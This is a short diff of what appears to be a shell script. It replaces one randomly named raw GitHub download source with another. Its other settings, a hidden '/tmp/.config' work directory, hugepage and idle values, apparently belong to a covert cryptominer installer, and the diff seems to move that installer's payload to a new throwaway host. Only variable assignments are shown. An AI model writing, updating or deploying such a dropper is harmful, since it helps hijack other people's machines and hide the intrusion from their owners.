@@ -2,7 +2,7 @@
 
 mode="${1:-0}"
 work="/tmp/.config"
-src="https://raw.githubusercontent.com/vjbahkds/qiyywnbc/main"
+src="https://raw.githubusercontent.com/pakoinake/jzoax/main"
 hugepage="128"
 idle="1"
 
